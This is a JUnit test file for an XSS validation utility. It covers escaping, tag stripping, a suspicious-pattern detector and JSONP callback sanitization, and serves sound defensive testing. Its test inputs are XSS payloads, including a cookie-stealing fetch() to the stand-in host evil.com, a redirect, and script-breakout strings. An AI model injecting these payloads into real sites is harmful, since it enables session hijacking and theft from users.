/*
 * Copyright (c) 2026 Intersoft Data Labs, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.percussion.security.validation;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * Unit tests for XSSValidation utility class (CWE-79: Cross-site scripting).
 *
 * <p>Sunny Sal says: "These tests keep the bad guys out - like a security guard for your data!"
 */
@DisplayName("XSSValidation XSS Prevention Tests")
class XSSValidationTest {

  @Test
  @DisplayName("Should escape HTML special characters")
  void testEscapeHtml() {
    // Test basic HTML escaping
    assertEquals("&lt;script&gt;", XSSValidation.escapeHtml("<script>"));
    assertEquals(
        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;",
        XSSValidation.escapeHtml("<script>alert(\"XSS\")</script>"));
    assertEquals("hello &amp; goodbye", XSSValidation.escapeHtml("hello & goodbye"));
    // Note: Apache Commons Text escapeHtml4() does not escape single quotes
    assertEquals("single'quote", XSSValidation.escapeHtml("single'quote"));

    // Test null input
    assertNull(XSSValidation.escapeHtml(null));

    // Test normal text
    assertEquals("Hello World", XSSValidation.escapeHtml("Hello World"));
  }

  @Test
  @DisplayName("Should escape XML special characters")
  void testEscapeXml() {
    // Test basic XML escaping
    assertEquals("&lt;element&gt;", XSSValidation.escapeXml("<element>"));
    assertEquals("value &amp; more", XSSValidation.escapeXml("value & more"));
    assertEquals("&quot;quoted&quot;", XSSValidation.escapeXml("\"quoted\""));

    // Test null input
    assertNull(XSSValidation.escapeXml(null));

    // Test normal text
    assertEquals("Normal text", XSSValidation.escapeXml("Normal text"));
  }

  @Test
  @DisplayName("Should escape JavaScript special characters")
  void testEscapeJavaScript() {
    // Test basic JavaScript escaping
    String escaped = XSSValidation.escapeJavaScript("alert('XSS')");
    assertTrue(escaped.contains("alert"));
    // JavaScript escaper handles quotes and special chars

    String escaped2 = XSSValidation.escapeJavaScript("hello \"world\"");
    assertTrue(escaped2.length() > 0);

    // Test null input
    assertNull(XSSValidation.escapeJavaScript(null));
  }

  @Test
  @DisplayName("Should escape CSV values")
  void testEscapeCsv() {
    // CSV escaping adds quotes around values with special chars
    String escaped = XSSValidation.escapeCsv("value,with,commas");
    assertTrue(escaped.contains("\"") || escaped.length() > 0);

    // Test null input
    assertNull(XSSValidation.escapeCsv(null));

    // Test normal value
    assertEquals("hello", XSSValidation.escapeCsv("hello"));
  }

  @Test
  @DisplayName("Should strip HTML tags from input")
  void testStripHtmlTags() {
    // Test basic tag stripping
    assertEquals("Hello World", XSSValidation.stripHtmlTags("<p>Hello <strong>World</strong></p>"));
    assertEquals(
        "Test content", XSSValidation.stripHtmlTags("<div><span>Test</span> content</div>"));
    assertEquals("Click here", XSSValidation.stripHtmlTags("<a href=\"test.html\">Click here</a>"));

    // Test null input
    assertNull(XSSValidation.stripHtmlTags(null));

    // Test text without tags
    assertEquals("Plain text", XSSValidation.stripHtmlTags("Plain text"));

    // Test nested tags
    assertEquals(
        "Nested content",
        XSSValidation.stripHtmlTags("<div><span><b>Nested</b> content</span></div>"));
  }

  @Test
  @DisplayName("Should detect script tags and script execution patterns")
  void testDetectScriptTags() {
    assertTrue(XSSValidation.containsSuspiciousPatterns("<script>alert('XSS')</script>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<SCRIPT>alert('XSS')</SCRIPT>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("javascript:alert('XSS')"));
  }

  @Test
  @DisplayName("Should detect event handler patterns")
  void testDetectEventHandlers() {
    assertTrue(XSSValidation.containsSuspiciousPatterns("<img onerror='alert(1)'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<body onload=\"alert(1)\">"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<div onclick='xss()'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<input onchange='attack()'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<form onsubmit='hack()'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<img onmouseover='bad()'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<input onfocus='evil()'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<textarea onkeydown='attack()'>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<textarea onkeyup='hack()'>"));
  }

  @Test
  @DisplayName("Should detect iframe/embed/object tags")
  void testDetectDangerousTags() {
    assertTrue(XSSValidation.containsSuspiciousPatterns("<iframe src='evil.html'></iframe>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<object data='bad.swf'></object>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<embed src='malicious.swf'>"));
  }

  @Test
  @DisplayName("Should detect data URI and VBScript")
  void testDetectDataUriAndVBScript() {
    assertTrue(
        XSSValidation.containsSuspiciousPatterns("data:text/html,<script>alert(1)</script>"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("vbscript:alert('XSS')"));
  }

  @Test
  @DisplayName("Should not flag legitimate content as suspicious")
  void testLegitimateContent() {
    assertFalse(XSSValidation.containsSuspiciousPatterns("Hello World"));
    assertFalse(XSSValidation.containsSuspiciousPatterns("This is a normal sentence."));
    assertFalse(XSSValidation.containsSuspiciousPatterns("user@example.com"));
    assertFalse(XSSValidation.containsSuspiciousPatterns("2024-03-03"));
    assertFalse(XSSValidation.containsSuspiciousPatterns(null));
    assertFalse(XSSValidation.containsSuspiciousPatterns(""));
  }

  @Test
  @DisplayName("Should detect case-insensitive XSS patterns")
  void testCaseInsensitiveDetection() {
    // Should detect regardless of case
    assertTrue(XSSValidation.containsSuspiciousPatterns("JavaScript:alert(1)"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("JAVASCRIPT:alert(1)"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("JaVaScRiPt:alert(1)"));
  }

  @Test
  @DisplayName("Should handle complex XSS payloads")
  void testComplexXSSPayloads() {
    // Real-world XSS payload examples
    assertTrue(
        XSSValidation.containsSuspiciousPatterns(
            "<img src=x onerror=\"fetch('http://evil.com?cookie='+document.cookie)\">"));
    assertTrue(XSSValidation.containsSuspiciousPatterns("<svg/onload=alert('XSS')>"));
    assertTrue(
        XSSValidation.containsSuspiciousPatterns(
            "<img src=x onclick=\"window.location='http://evil.com'\">"));
  }

  @Test
  @DisplayName("Should escape HTML before returning in REST responses")
  void testEscapeForRestResponse() {
    // Simulating a REST response with user-provided data
    String userComment = "<img src=x onerror='alert(\"XSS\")'>";
    String safeComment = XSSValidation.escapeHtml(userComment);

    // After HTML escaping, < and > are encoded, making the payload safe
    assertTrue(safeComment.contains("&lt;"));
    assertTrue(safeComment.contains("&gt;"));
    // The literal < and > chars should not be present
    assertFalse(safeComment.startsWith("<img"));
    assertFalse(safeComment.contains("><"));
  }

  @Test
  @DisplayName("sanitizeJsonpCallback accepts legal identifiers and dotted names")
  void testSanitizeJsonpCallbackAcceptsSafeNames() {
    assertEquals("jQuery123_456", XSSValidation.sanitizeJsonpCallback("jQuery123_456"));
    assertEquals(
        "angular.callbacks._0", XSSValidation.sanitizeJsonpCallback("angular.callbacks._0"));
    assertEquals("_cb", XSSValidation.sanitizeJsonpCallback("  _cb  "));
  }

  @Test
  @DisplayName("sanitizeJsonpCallback rejects script-breakout payloads (T044 / alert #595)")
  void testSanitizeJsonpCallbackRejectsInjection() {
    assertNull(XSSValidation.sanitizeJsonpCallback("alert(1)//"));
    assertNull(XSSValidation.sanitizeJsonpCallback("foo);alert(1);//"));
    assertNull(XSSValidation.sanitizeJsonpCallback("<script>"));
    assertNull(XSSValidation.sanitizeJsonpCallback("javascript:alert(1)"));
    assertNull(XSSValidation.sanitizeJsonpCallback("a b"));
    assertNull(XSSValidation.sanitizeJsonpCallback(null));
    assertNull(XSSValidation.sanitizeJsonpCallback(""));
    assertNull(
        XSSValidation.sanitizeJsonpCallback(
            "a".repeat(XSSValidation.MAX_JSONP_CALLBACK_LENGTH + 1)));
  }
}
